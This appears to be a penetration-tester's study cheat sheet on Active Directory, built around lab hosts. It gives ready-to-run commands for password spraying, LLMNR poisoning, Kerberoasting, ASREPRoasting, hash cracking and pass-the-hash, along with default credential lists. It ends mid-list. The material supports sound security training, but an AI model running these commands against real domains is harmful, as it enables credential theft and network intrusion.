# Active Directory

## **Active Directory Basics**

Active Directory (AD) is a directory service for Windows network environments.\
AD provides authentication and authorization functions within a Windows domain environment.\
It's a hierarchical structure that allows for centralized management of an organization's resources

Resources in AD can be users, computers, groups, network devices, file shares, group policies, devices, and trusts. Any user in AD, regardless of their privileges, can be used to enumerate most objects within the AD environment.&#x20;

Many features in AD are not secure by default and can be easily misconfigured.\
This weakness can be leveraged to move laterally and vertically within a network and gain unauthorized access.

***

## **Useful Resources**

#### **Learning Resources**

* [https://book.hacktricks.xyz/windows-hardening/active-directory-methodology#basic-overview](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology#basic-overview)
* [https://www.hackthebox.com/blog/active-directory-penetration-testing-cheatsheet-and-guide](https://www.hackthebox.com/blog/active-directory-penetration-testing-cheatsheet-and-guide)
* [https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/kerberos-authentication](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/kerberos-authentication)
* [https://academy.hackthebox.com/module/details/74](https://academy.hackthebox.com/module/details/74)
* [https://www.geeksforgeeks.org/active-directory-pentesting/](https://www.geeksforgeeks.org/active-directory-pentesting/)

#### **Other Useful Resources & Cheatsheets**

* [https://wadcoms.github.io/](https://wadcoms.github.io/)
* [https://github.com/geeksniper/active-directory-pentest](https://github.com/geeksniper/active-directory-pentest)

#### **Active Directory Helper Tools**

| Tool                                                                                                                                          | Description                                                                                                                                                                                                                                                                                 |
| --------------------------------------------------------------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| [Ghostpack Compiled Binaries](https://github.com/r3motecontrol/Ghostpack-CompiledBinaries)                                                    | Repository containing some of the following tools' pre-compiled binaries                                                                                                                                                                                                                    |
| [PowerView](https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1)                                                   | PowerView is one of the main powershell tools to perform network and Windows domain enumeration and exploitation. It is useful for checking access, permissions, but also to enumerate potential users for Kerberoasting/ASREPRoasting attacks                                              |
| [Mimikatz](https://github.com/ParrotSec/mimikatz)                                                                                             | Performs many functions. Noteably, pass-the-hash attacks, extracting plaintext passwords, and kerberos ticket extraction from memory on host.                                                                                                                                               |
| [Active Directory Built-In PowerShell Module](https://learn.microsoft.com/en-us/powershell/module/activedirectory/?view=windowsserver2022-ps) | Built-In Cmdlets to manage Active Directory domains, useful tool for enumeration                                                                                                                                                                                                            |
| [SharpView](https://github.com/dmchell/SharpView)                                                                                             | Sharpview is the C# version of PowerView                                                                                                                                                                                                                                                    |
| [BloodHound](https://github.com/BloodHoundAD/BloodHound)                                                                                      | Visually map out AD relationships and help plan attack paths that may otherwise go unnoticed.                                                                                                                                                                                               |
| [SharpHound](https://github.com/BloodHoundAD/BloodHound/tree/master/Collectors)                                                               | Data collector to gather information from Active Directory about varying AD objects such as users, groups, computers, ACLs, GPOs, user and computer attributes, user sessions, and more. The tool produces JSON files which can then be ingested into the BloodHound GUI tool for analysis. |
| [BloodHound.py](https://github.com/fox-it/BloodHound.py)                                                                                      | A Python-based BloodHound ingestor based on the [Impacket toolkit](https://github.com/CoreSecurity/impacket/). It supports most BloodHound collection methods and **can be run from a non-domain joined attacker host**. The output can be ingested into the BloodHound GUI for analysis.   |
| [Kerbrute](https://github.com/ropnop/kerbrute)                                                                                                | A tool written in Go that uses Kerberos Pre-Authentication to enumerate Active Directory accounts and perform password spraying and brute forcing.                                                                                                                                          |
| [Impacket toolkit](https://github.com/SecureAuthCorp/impacket)                                                                                | A collection of tools written in Python for interacting with network protocols. The suite of tools contains various scripts for enumerating and attacking Active Directory.                                                                                                                 |
| [Responder](https://github.com/lgandx/Responder)                                                                                              | Tool to poison LLMNR, NBT-NS and MDNS, with many different functions.                                                                                                                                                                                                                       |
| [Inveigh.ps1](https://github.com/Kevin-Robertson/Inveigh/blob/master/Inveigh.ps1)                                                             | Similar to Responder, a PowerShell tool for performing various network spoofing and poisoning attacks.                                                                                                                                                                                      |
| [C# Inveigh (InveighZero)](https://github.com/Kevin-Robertson/Inveigh/tree/master/Inveigh)                                                    | C# version of Inveigh with a semi-interactive console for interacting with captured data such as username and password hashes.                                                                                                                                                              |
| [rpcclient](https://www.samba.org/samba/docs/current/man-html/rpcclient.1.html)                                                               | Tool that can be used to perform a variety of Active Directory enumeration tasks via the remote RPC service.                                                                                                                                                                                |
| [CrackMapExec (CME)](https://github.com/byt3bl33d3r/CrackMapExec)                                                                             | CME is an enumeration, attack, and post-exploitation toolkit. CME attempts to "live off the land" and abuse built-in AD features and protocols such as SMB, WMI, WinRM, and MSSQL.                                                                                                          |
| [Rubeus](https://github.com/GhostPack/Rubeus)                                                                                                 | C# tool built for Kerberos Abuse.                                                                                                                                                                                                                                                           |
| [GetUserSPNs.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/GetUserSPNs.py)                                              | Impacket module geared towards finding Service Principal names tied to normal users. Useful for Kerberoasting attacks.                                                                                                                                                                      |
| [enum4linux-ng](https://github.com/cddmp/enum4linux-ng)                                                                                       | Tool for enumerating information from Windows and Samba systems.                                                                                                                                                                                                                            |
| [ldapsearch](https://linux.die.net/man/1/ldapsearch)                                                                                          | Built in interface for interacting with the LDAP protocol.                                                                                                                                                                                                                                  |
| [windapsearch](https://github.com/ropnop/windapsearch)                                                                                        | A Python script used to enumerate AD users, groups, and computers using LDAP queries. Useful for automating custom LDAP queries.                                                                                                                                                            |
| [DomainPasswordSpray.ps1](https://github.com/dafthack/DomainPasswordSpray)                                                                    | DomainPasswordSpray is a tool written in PowerShell to perform a password spray attack against users of a domain.                                                                                                                                                                           |
| [LAPSToolkit](https://github.com/leoloobeek/LAPSToolkit)                                                                                      | Tool to leverage PowerView to audit and attack Active Directory environments that have deployed Microsoft's Local Administrator Password Solution (LAPS).                                                                                                                                   |
| [Snaffler](https://github.com/SnaffCon/Snaffler)                                                                                              | Tool for finding useful information and credentials in Active Directory on computers with accessible file shares.                                                                                                                                                                           |
| [setspn.exe](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc731241\(v=ws.11\))           | Reads, modifies, and deletes the Service Principal Names (SPN) directory property for an Active Directory service account. Useful for a targeted kerberoasting attack                                                                                                                       |
| [secretsdump.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/secretsdump.py)                                              | Remotely dump SAM and LSA secrets from a host.                                                                                                                                                                                                                                              |
| [evil-winrm](https://github.com/Hackplayers/evil-winrm)                                                                                       | Provides us with an interactive shell on host over the WinRM protocol.                                                                                                                                                                                                                      |
| [mssqlclient.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/mssqlclient.py)                                              | Part of Impacket toolset, it provides the ability to interact with MSSQL databases.                                                                                                                                                                                                         |
| [noPac.py](https://github.com/Ridter/noPac)                                                                                                   | Exploit combo using CVE-2021-42278 and CVE-2021-42287 to impersonate Domain Admin from standard domain user.                                                                                                                                                                                |
| [ntlmrelayx.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/ntlmrelayx.py)                                                | Part of the Impacket toolset, it performs SMB relay attacks.                                                                                                                                                                                                                                |
| [gettgtpkinit.py](https://github.com/dirkjanm/PKINITtools/blob/master/gettgtpkinit.py)                                                        | Tool for manipulating certificates and TGTs.                                                                                                                                                                                                                                                |
| [adidnsdump](https://github.com/dirkjanm/adidnsdump)                                                                                          | A tool for enumeration and dumping of DNS records from a domain. Similar to performing a DNS Zone transfer.                                                                                                                                                                                 |
| [gpp-decrypt](https://github.com/t0thkr1s/gpp-decrypt)                                                                                        | Extracts usernames and passwords from Group Policy preferences.                                                                                                                                                                                                                             |
| [GetNPUsers.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/GetNPUsers.py)                                                | Attempt to list and get TGTs for those users that have the property 'Do not require Kerberos preauthentication' set.                                                                                                                                                                        |
| [lookupsid.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/lookupsid.py)                                                  | SID bruteforcing tool.                                                                                                                                                                                                                                                                      |
| [ticketer.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/ticketer.py)                                                    | A tool for creation and customization of TGT/TGS tickets.                                                                                                                                                                                                                                   |
| [raiseChild.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/raiseChild.py)                                                | Part of the Impacket toolset, It is a tool for child to parent domain privilege escalation.                                                                                                                                                                                                 |
| [Active Directory Explorer](https://docs.microsoft.com/en-us/sysinternals/downloads/adexplorer)                                               | AD viewer and editor that can be used to navigate an AD database and view object properties and attributes. It can also be used to save a snapshot of an AD database for offline analysis.                                                                                                  |
| [PingCastle](https://www.pingcastle.com/documentation/)                                                                                       | Used for auditing the security level of an AD environment                                                                                                                                                                                                                                   |
| [Group3r](https://github.com/Group3r/Group3r)                                                                                                 | Group3r is useful for auditing and finding security misconfigurations in AD Group Policy Objects (GPO).                                                                                                                                                                                     |
| [ADRecon](https://github.com/adrecon/ADRecon)                                                                                                 | A tool used to extract various data from a target AD environment.                                                                                                                                                                                                                           |

***

## **Recon & Discovery**

* Enumerate the [DNS](https://alessio-romano.github.io/sfoffo-pentesting-notes/notes/protocols-and-services/DNS.html) service to gain information about servers, shares, and other domain objects
* Try [fuzzing](https://alessio-romano.github.io/sfoffo-pentesting-notes/notes/fuzzing/fuzzing.html) for domain information
* Leverage OSINT techniques to gain information about the domain.
* Refer to the Information Gathering notes

***

## **Initial Access**

After having access (eventually gained through pivoting after compromising a domain-joined host) to the network where the AD environment resides, you should enumerate all domain-joined hosts and their role in the AD environment. The main objective is to find the Domain Controller (DC) in order to move forward with the next enumeration steps.

To find hosts inside the AD environment:

* Ping sweep from linux: `fping -asgq 172.16.5.0/23`
* Scan the internal network using nmap

After that, there are several options to move forward:

1. Whenever possible, enumerate the [SMB](https://alessio-romano.github.io/sfoffo-pentesting-notes/notes/protocols-and-services/SMB.html) service and shares, checking for `NULL`, `guest` and [SMB Common Credentials](broken-reference) authentication
2. Enumerate existing users with kerbrute
3. If possible, enumerate password policies (requires valid credentials)
4. Leverage password spraying using [Common AD Passwords](broken-reference)
5. Leverage Responder (from Linux) or Inveigh (from Windows) to perform LLMNR/NTB-NS Poisoning

### **SMB NULL Session, Guest and Common Credentials Authentication**

* **Guest Authentication:** `enum4linux -a -u "guest" -p "" <DC IP>`
* **Guest Authentication:** `smbmap -u "guest" -p "" -P 445 -H <DC IP>`
* **Guest Authentication:** `smbclient -U '%' -L //<DC IP> && smbclient -U 'guest%' -L //`
* **NULL Session:** `smbclient -N -L //<FQDN/IP>`
* **NULL Session:** `crackmapexec smb <FQDN/IP> --shares -u '' -p ''`
* **NULL Session:** `smbmap -u "" -p "" -P 445 -H <DC IP>`
* **NULL Session:** `enum4linux -a -u "" -p "" <DC IP>`
* Check for other common SMB credentials, as listed below

### **Common SMB Credentials**

Source: [https://book.hacktricks.xyz/network-services-pentesting/pentesting-smb#possible-credentials](https://book.hacktricks.xyz/network-services-pentesting/pentesting-smb#possible-credentials)

| Common Username(s)   | Common Password                         |
| -------------------- | --------------------------------------- |
| (blank)              | (blank)                                 |
| guest                | (blank)                                 |
| Administrator, admin | (blank), password, administrator, admin |
| arcserve             | arcserve, backup                        |
| tivoli, tmersrvd     | tivoli, tmersrvd, admin                 |
| backupexec, backup   | backupexec, backup, arcada              |
| test, lab, demo      | password, test, lab, demo               |

***

### **Active Directory Users Enumeration**

> Common wordlists for user enumeration: [jsmith.txt](https://github.com/insidetrust/statistically-likely-usernames/blob/master/jsmith.txt) and [jsmith2.txt](https://github.com/insidetrust/statistically-likely-usernames/blob/master/jsmith2.txt) user lists from [Insidetrust](https://github.com/insidetrust/statistically-likely-usernames/tree/master).\
> To perform user enumeration, we need to know the DC's IP address, ideally found earlier through initial enumeration

**Enumerate users with Kerbrute:**

* Get Kerbrute's precompiled binary: [https://github.com/ropnop/kerbrute/releases/tag/v1.0.3](https://github.com/ropnop/kerbrute/releases/tag/v1.0.3)
* Enumerate Users: `kerbrute userenum -d DOMAINNAME.EXAMPLE --dc 172.16.5.5 jsmith.txt -o valid_ad_users`

**Enumerate users with WindapSearch:**

* Get WindapSearch: `git clone https://github.com/ropnop/windapsearch.git`
* Enumerate Users: `./windapsearch.py --dc-ip 172.16.5.5 -u "" -U`

**Alternatives:**

* `enum4linux -U 172.16.5.5 | grep "user:" | cut -f2 -d"[" | cut -f1 -d"]`
* `rpcclient -U "" -N 172.16.5.5` followed by `enumdomuser`
* `crackmapexec smb 172.16.5.5 --users`

***

### **LLMNR/NTB-NS Poisoning**

* LLMNR/NTB-NS poisoning refers to a Man in the Middle(MITM) attack on Link-Local Multicast Name Resolution (LLMNR) and NetBIOS Name Service (NBT-NS) broadcasts.
* LLMNR and NBT-NS are Microsoft Windows components that serve as **alternate methods of host identification that can be used when DNS fails**.
* If a machine attempts to resolve a host, but DNS resolution fails, typically, **the machine will try to ask all other machines on the local network for the correct host address via LLMNR**.
* If LLMNR fails, then NBT-NS will be used

> Basically, the idea is that when LLMNR/NBT-NS are used for name resolution, ANY host on the network can reply. This is where we come in with Responder to poison these requests.\
> This poisoning effort is done to get the victims to communicate with our system by pretending that our rogue system knows the location of the requested host.\
> \
> We can spoof an authoritative name resolution source (a host that's supposed to belong in the network segment) in the broadcast domain by responding to LLMNR and NBT-NS traffic as if they have an answer for the requesting host.\
> If the requested host requires name resolution or authentication actions, we can capture the NetNTLM hash and subject it to an offline brute force attack in an attempt to retrieve the cleartext password.\
> \
> The captured authentication request can also be relayed to access another host or used against a different protocol (such as LDAP) on the same host.\
> LLMNR/NBNS spoofing combined with a lack of SMB signing can often lead to administrative access on hosts within a domain.

**LLMNR/NTB-NS Poisoning from Linux with Responder:**

1. To start responder: `sudo responder -I ens224` where ens224 is the name of the network interface connected to the internal network where the AD environment resides
2. Results will be printed on screen while running, and saved inside the `/usr/share/responder/logs` directory
3. To crack an NTLMv2 hash with hashcat: `hashcat -m 5600 hashfile /usr/share/wordlists/rockyou.txt`

**LLMNR/NTB-NS Poisoning from Windows with Inveigh:**

1. Get Inveigh: `git clone https://github.com/Kevin-Robertson/Inveigh`
2. Use the following **Powershell** commands:
   * `Import-Module .\Inveigh.ps1`
   * `Invoke-Inveigh Y -NBNS Y -ConsoleOutput Y -FileOutput Y`
3. Alternatively, use the compiled version of Inveigh with `.\Inveigh.exe`

***

### **Password Policies Enumeration**

> Before performing password spraying, it's a good idea to enumerate the password policy in order to avoid locking out the target user's account.\
> This is also useful to find out the minimum password complexity requirements.

**Enumerate the Password Policy from Linux:**

1. CME with credentials: crackmapexec smb 172.16.5.5 -u validuser -p validpass --pass-pol
2. RPCClient with NULL Session: `rpcclient -U "" -N 172.16.5.5` followed by `querydominfo`
3. Enum4Linux: `enum4linux -P 172.16.5.5`
4. Enum4linux-ng with output to YAML and JSON: `enum4linux-ng -P 172.16.5.5 -oA outputfile`

**Enumerate the Password Policy from Windows:**

1. `net accounts`
2. Powerview: `Import-Module .\PowerView.ps1` followed by `Get-DomainPolicy`

***

### **Password Spraying**

> This attack involves attempting to log into an exposed service using one common password and a longer list of usernames or email addresses.\
> \
> The usernames and emails may have been gathered during the OSINT phase of the penetration test or during our initial enumeration attempts.

**Perform Password Spraying from Linux:**

1. Bash One-Liner using rpcclient:\
   `for u in $(cat valid_users.txt);do rpcclient -U "$u%Welcome1" -c "getusername;quit" 172.16.5.5 | grep Authority; done`
2. Using Kerbrute:\
   `kerbrute passwordspray -d inlanefreight.local --dc 172.16.5.5 valid_users.txt Welcome1`
3. Using CrackMapExec:\
   `sudo crackmapexec smb 172.16.5.5 -u valid_users.txt -p Password123 | grep +`

**Perform Password Spraying from Windows:**

1. Using DomainPasswordSpray:\
   `Import-Module .\DomainPasswordSpray.ps1` followed by\
   `Invoke-DomainPasswordSpray -Password Welcome1 -OutFile spray_success -ErrorAction SilentlyContinue`

### **Common AD Users' Passwords**

* Welcome1
* Welcome123
* Password123
* Passw0rd

***

## **Internal Discovery & Enumeration**

> After finding valid credentials to authenticate to the active directory environment, your final objective is to compromise the entire Active Directory environment.\
> In order to do so, you will probably need to move laterally between users and machine until getting privileged access to the domain controller

### **Enumerating Security Controls**

**Enumerate Windows Defender and App Locker policies from PowerShell:**

1. Check the status of Windows Defender:\
   `Get-MpComputerStatus`
2. View AppLocker policies:\
   `Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections`
3. Discover the PowerShell Language Mode being used:\
   `$ExecutionContext.SessionState.LanguageMode`

**Enumerate Windows Local Administrator Password Solution (LAPS):**

> LAPS allows management of unique, randomised local admin passwords on domain-joined hosts.\
> These passwords are centrally stored in Active Directory and restricted to some users through ACLs.\
> **Enumerating LAPS can be useful to find users who have read access to the LAPS passwords**

**Reference/Useful Resource:**\
[https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/laps](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/laps)

**LAPS Toolkit:**

1. Get [LAPSToolkit](https://github.com/leoloobeek/LAPSToolkit)
2. Import the module in Powershell using `Import-Module .\LAPSToolkit.ps1`
3. Discover LAPS Delegated Groups: `Find-LAPSDelegatedGroups`
4. Check the rights on each computer with LAPS enabled for any groups with read access and users with All Extended Rights: `Find-AdmPwdExtendedRights`
5. Search for computers that have LAPS enabled. This function can discover password expiration and randomized passwords: `Get-LAPSComputers`

***

### **Authenticated Enumeration**

#### **Enumeration using BloodHound**

* **Linux:** Collect Data using the [BloodHound Python Collector](https://github.com/fox-it/BloodHound.py): `sudo bloodhound-python -u 'forend' -p 'Klmcargo2' -ns 172.16.5.5 -d inlanefreight.local -c all`
* **Windows:** Collect data:
  * using [SharpHound Collector](https://github.com/BloodHoundAD/BloodHound/tree/master/Collectors): `.\SharpHound.exe -c All --zipfilename NAME`
  * Using [SharpHound.ps1](https://github.com/BloodHoundAD/BloodHound/blob/master/Collectors/SharpHound.ps1): `Import-Module .\SharpHound.ps1` followed by `Invoke-Bloodhound -collectionmethod all -domain example.test -ldapuser validuserldap -ldappass hispass`
* Run the local Neo4J instance: `neo4j start` and login using the credentials you provided during the setup
* Run the Bloodhound GUI: `bloodhound`
* Upload the ZIP Files obtained by running `bloodhound.py`
* Enumerate the active directory environment using the bloodhound GUI and Cipher Queries:
  * Bloodhound Cipher Queries - Useful Resource:\
    [https://hausec.com/2019/09/09/bloodhound-cypher-cheatsheet/](https://hausec.com/2019/09/09/bloodhound-cypher-cheatsheet/)
  * Getting started with BloodHound GUI:\
    [https://bloodhound.readthedocs.io/en/latest/data-analysis/bloodhound-gui.html](https://bloodhound.readthedocs.io/en/latest/data-analysis/bloodhound-gui.html)

#### **Users and Groups Enumeration**

* PowerShell Oneliner to find all group membership of the current user:\
  `(New-Object System.DirectoryServices.DirectorySearcher("(&(objectCategory=User)(samAccountName=$($env:username)))")).FindOne().GetDirectoryEntry().memberOf`
* CME Users Enumeration:\
  `sudo crackmapexec smb 172.16.5.5 -u validuser -p validpassword --users`
* CME Groups Discovery:\
  `sudo crackmapexec smb 172.16.5.5 -u validuser -p validpassword --groups`
* CME Logged Users Discovery:\
  `sudo crackmapexec smb 172.16.5.125 -u validuser -p validpassword --loggedon-users`
* RPCClient users and relative identifiers enumeration:\
  `rpcclient --user domain\username%password ip` followed by `enumdomusers`
* RPCClient specific user enumeration through relative identifier:\
  `rpcclient --user domain\username%password ip` followed by `queryuser 0x457`
* WindapSearch Domain Admins Group Discovery:\
  `python3 windapsearch.py --dc-ip 172.16.5.5 -u domain\validuser -p validpassword --da`
* WindapSearch Recursive Discovery of users with nester permissions:\
  `python3 windapsearch.py --dc-ip 172.16.5.5 -u domain\validuser -p validpassword -PU`
* PS Active Directory Module - Enumerate Groups:\
  `Import-Module ActiveDirectory` followed by `Get-ADGroup -Filter *`
* PS Active Directory Module - Enumerate Specific Group:\
  `Import-Module ActiveDirectory` followed by `Get-ADGroup -Identity "Backup Operators"`
* PS Active Directory Module - Discover Members of a specific Group:\
  `Import-Module ActiveDirectory` followed by `Get-ADGroupMember -Identity "Backup Operators"`

#### **Lateral Movement**

1. Query domain controllers: `netdom query /domain:inlanefreight.local dc`
2. Query workstations and servers: `netdom query /domain:inlanefreight.local workstation`
3. Enumerate the Remote Desktop Users (RDP) group on a Windows target: `Get-NetLocalGroupMember -ComputerName NAME -GroupName "Remote Desktop Users"`
4. Enumerate the Remote Management Users (Win-RM) group on a Windows target:`Get-NetLocalGroupMember -ComputerName NAME -GroupName "Remote Management Users"`
5. Create a password variable: `$password = ConvertTo-SecureString "PasswordHere" -AsPlainText -Force`
6. Create a PS Credential Object: `$cred = new-object System.Management.Automation.PSCredential ("DOMAIN\username", $password)`
7. Get PowerShell session using a PS Credential Object: `Enter-PSSession -ComputerName ACADEMY-EA-DB01 -Credential $cred`
8. Get a PowerShell session through WinRM - Linux: `evil-winrm -i 10.129.201.234 -u forend`

#### **SMB Shares Enumeration**

* Run [Snaffler](https://github.com/SnaffCon/Snaffler) _from a Windows host_ to find useful data in shares:\
  `.\Snaffler.exe -d INLANEFREIGHT.LOCAL -s -v data`
* Run [Scavenger](https://github.com/SpiderLabs/scavenger/tree/master) _from a Linux host_ to find useful data in shares:\
  `python3 ./scavenger.py smb -t 10.0.0.10 -u administrator -p Password123 -d testdomain.local`
* CME Shares Enumeration:\
  `sudo crackmapexec smb 172.16.5.5 -u validuser -p validpassword --shares`
* CME Share Spidering:\
  `sudo crackmapexec smb 172.16.5.5 -u validuser -p validpassword -M spider_plus --share sharename`
* SMBMap Share Enumeration:\
  `smbmap -u validuser -p validpassword -d INLANEFREIGHT.LOCAL -H 172.16.5.5`
* SMBMap Share Recursive Directory Listing\
  `smbmap -u validuser -p validpassword -d INLANEFREIGHT.LOCAL -H 172.16.5.5 -R SHARENAME --dir-only`
* Download Shares Recursively:\
  `smbget -u guest -R smb://10.129.8.111/Development/`

#### **Enumeration using PowerView**

> Always run `Import-Module .\PowerView.ps1` first to import the PowerView Module in the current PowerShell session

**Domain Information, ACLs & Policies**

* Return the current (or specified) domain information: `Get-Domain`
* Return the list of domain controllers for the specified domain: `Get-DomainController`
* Search all (or specific) organizational units (OUs): `Get-DomainOU`
* Find Objects ACLs: `Find-InterestingDomainAcl`
* Return a list of servers likely functioning as file servers: `Get-DomainFileServer`
* Return all file systems for the specified domain: `Get-DomainDFSShare`
* Return all (or specific) Group Policy Objects (GPOs): `Get-DomainGPO`
* Return the default domain policy or the domain controller policy: `Get-DomainPolicy`

**Users & Groups:**

* Convert a User or Group name to it's SID: `ConvertTo-SID <string>`
* Return all (or specific) users: `Get-DomainUser`
* Return all (or specific) computers: `Get-DomainComputer`
* Return all (or specific) groups: `Get-DomainGroup`
* Find members of a group: `Get-DomainGroupMember -Identity "Domain Admins" -Recurse`
* Find all local groups on local or remote machine: `Get-NetLocalGroup`
* Find all members of a local group: `Get-NetLocalGroupMember`
* Return session information for a remote machine or the local one: `Get-NetSession`
* Check if the current user has admin access to local or remote machine: `Test-AdminAccess`
* Enumerate machines where the current user has local admin access: `Find-LocalAdminAccess`

**Domain Shares:**

* Find a list of open shares on local or remote machine: `Get-NetShare`
* Find reachable shares on domain machines: `Find-DomainShare`
* Enumerate files in shares matching specific criteria: `Find-InterestingDomainShareFile`

**Domain & Forest Trusts:**

* Return domain trusts for a specified domain or the current one: `Get-DomainTrust`
* Return forest trusts for a specified forest or the current one: `Get-ForestTrust`
* Enumerate users who belong to groups outside of the user's domain: `Get-DomainForeignUser`
* Enumerate groups and members outside of the current domain: `Get-DomainForeignGroupMember`
* Enumerate all trusts for current domain and any others seen: `Get-DomainTrustMapping`

***

## **Kerberos**

* Default authentication protocol for domain accounts
* Kerberos is a stateless authentication protocol based on tickets, rather than transmitting user passwords over the network
* Domain Controllers have a Kerberos Key Distribution Center (KDC) that issues tickets.
* When a user initiates a login request to a system, the client they are using to authenticate requests a ticket from the KDC, encrypting the request with the user's password.
* If the KDC can decrypt the request (AS-REQ) using their password, it will create a Ticket Granting Ticket (TGT) and transmit it to the user.
* The user then presents its TGT to a Domain Controller to request a Ticket Granting Service (TGS) ticket, encrypted with the associated service's NTLM password hash.
* Finally, the client requests access to the required service by presenting the TGS to the application or service, which decrypts it with its password hash.
* If the entire process completes appropriately, the user will be permitted to access the requested service or application.
* Reference: [HacktheBox Academy - Introduction to Active Directory](https://academy.hackthebox.com/module/74/section/701)

***

### **Kerberoasting**

> Kerberoasting is a technique to collect TGS tickets for service accounts, which can be enumerated by any user since no special privileges are required. To check if a user account is a service user, you just need to check if the property "ServicePrincipalName" (SPN) is not null. In order words, the first step to perform Kerberoasting is to find users with the SPN property set.\
> The goal of Kerberoasting is to crack the TGS tickets for service accounts (with SPN set). The TGS tickets are encrypted with keys derived from user passwords. As a consequence, it's possible to gain the password of the targeted service user by offline password cracking.

1. **Enumerate service accounts with SPN set:**
   * Using GetUsersSPNs.py from Linux:\
     `GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/username`
   * Using the (built-in) Active Directory module:\
     `Import-Module ActiveDirectory` followed by `Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName`
   * Using PowerView:\
     `Import-Module .\PowerView.ps1` followed by `Get-DomainUser -SPN -Properties samaccountname,ServicePrincipalName`
   * Using setspn from Windows:\
     `setspn.exe -Q */*`
2. **Request TGS tickets:**
   * Request all tickets with GetUsersSPNs.py from Linux:\
     `GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/username -request -outputfile filename`
   * Request a single ticket with GetUsersSPNs.py from Linux:\
     `GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/username -request-user target-user -outputfile filename`
   * Request ticket with PowerView:\
     `Import-Module .\PowerView.ps1` followed by `Get-DomainUser -Identity targetuser | Get-DomainSPNTicket -Format Hashcat`
   * Request all tickets with setspn:\
     `setspn.exe -T INLANEFREIGHT.LOCAL -Q */* | Select-String '^CN' -Context 0,1 | % { New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $_.Context.PostContext[0].Trim() }`
   * Request all tickets with mimikatz:\
     `base64 /out:true` followed by `kerberos::list /export`
   * Request specific ticket using Rubeus:\
     `.\Rubeus.exe kerberoast /user:svc_mssql /outfile:hashes.kerberoast /nowrap`
   * Request tickets for users with admin count set to 1:\
     `.\Rubeus.exe kerberoast /ldapfilter:'admincount=1'`
   * Request all tickets using Rubeus:\
     `.\Rubeus.exe kerberoast /outfile:hashes.kerberoast /nowrap`
3. **Offline Password Cracking:**
   * Using Hashcat:\
     `hashcat -m 13100 tgstickethashfile /usr/share/wordlists/rockyou.txt`
   * Using John:\
     `john --format=krb5tgs --wordlist=/usr/share/wordlists/rockyou.txt hashes.kerberoast`

> Kerberoasting tools typically request RC4 encryption when performing the attack and initiating TGS-REQ requests. This is because RC4 is weaker and easier to crack offline using tools such as Hashcat than other encryption algorithms such as AES-128 and AES-256.\
> To recognize if a ticket is encrypted with RC4, check the hash value:
>
> * Tickets encrypted with RC4 will begin with `$krb5tgs$23$*`
> * Tickets encrypted with AES will begin with `$krb5tgs$18$*` or `$krb5tgs$17$*`

***

### **ASREPRoasting**

> ASREPRoasting is a technique to steal the password hashes of user accounts that have Kerberos preauthentication disabled.\
> When preauthentication is enabled, a user who needs access to a resource begins the Kerberos authentication process by sending an Authentication Server Request (AS-REQ) message to the domain controller (DC). The timestamp on that message is encrypted with the hash of the user’s password.\
> \
> If the DC can decrypt that timestamp using its own record of the user’s password hash, it will send back an Authentication Server Response (AS-REP) message that contains a Ticket Granting Ticket (TGT) issued by the Key Distribution Center (KDC), which is used for future access requests by the user.\
> \
> However, if preauthentication is disabled, an attacker could request authentication data for any user and the DC would return an AS-REP message. Since part of that message is encrypted using the user’s password, the attacker can then attempt to brute-force the user’s password offline. Note that preauthentication is enabled by default in Active Directory. However, it can be manually disabled for some users accounts.

1. **Enumerate accounts without preauth required**
   * Windows: `Import PowerView.ps1` followed by `Get-DomainUser -PreauthNotRequired -verbose`
   * Linux: `python GetNPUsers.py domain.example -usersfile usernames.txt -format hashcat -outputfile hashes.asreproast`
2. **Perform ASREPRoasting:**
   * (WINDOWS) Rubeus - Targeted User: `.\Rubeus.exe asreproast /format:hashcat /outfile:hashes.asreproast [/user:username]`
   * (WINDOWS) Rubeus - All affected users: `.\Rubeus.exe asreproast /format:hashcat /outfile:hashes.asreproast`
   * (LINUX) GetNPUsers - Username wordlist: `python3 GetNPUsers.py domain.name/validuser:validpass -dc-ip 10.10.10.1 -usersfile usernames.txt -request -format hashcat -outputfile hashes.txt`
3. **Offline Password Cracking:**
   * `john --wordlist=/usr/share/wordlists/rockyou.txt hashes.asreproast`
   * `hashcat -m 18200 --force -a 0 hashes.asreproast /usr/share/wordlists/rockyou.txt`

***

### **Pass the Hash (PtH)**

> * A Pass the Hash (PtH) attack is a technique where an attacker uses a password hash instead of a plain text password for authentication.
> * The attacker doesn't need to decrypt the hash to authenticate.
> * PtH exploit the authentication protocol, as the password hash remains static for every session until the password is changed.
> * Note: the attacker must have administrative privileges or particular privileges on the target machine to obtain a password hash.
> * Hashes can be obtained in several ways, including:
>   * Dumping the local SAM database from a compromised host.
>   * Extracting hashes from the NTDS database (ntds.dit) on a Domain Controller.
>   * Pulling the hashes from memory (lsass.exe).

**Performing PtH Attacks:**

1. Windows - Using mimikatz:\
   `privilege::debug "sekurlsa::pth /user:username /rc4:hash /domain:domain.name /run:cmd.exe" exit`
2. Linux - Using PsExec:\
   `impacket-psexec user@targetIP -hashes :hash`
3. Linux - Using evil-winrm:\
   `evil-winrm -i <ip> -u Administrator -H "<passwordhash>"`
4. Linux - Using crackmapexec:\
   `crackmapexec smb targetIP -u Administrator -d domain.name -H hash`
5. Pass the Hash with RDP:
